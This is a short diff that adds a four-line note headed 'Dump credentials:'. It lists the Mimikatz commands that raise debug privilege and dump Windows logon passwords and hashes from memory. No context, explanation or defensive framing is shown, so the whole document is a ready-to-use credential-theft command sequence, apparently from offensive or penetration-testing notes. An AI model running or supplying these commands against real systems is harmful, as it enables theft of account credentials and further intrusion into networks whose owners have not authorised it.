@@ -1,0 +1,4 @@
+Dump credentials:
+mimikatz.exe
+privilege::debug
+sekurlsa::logonPasswords full
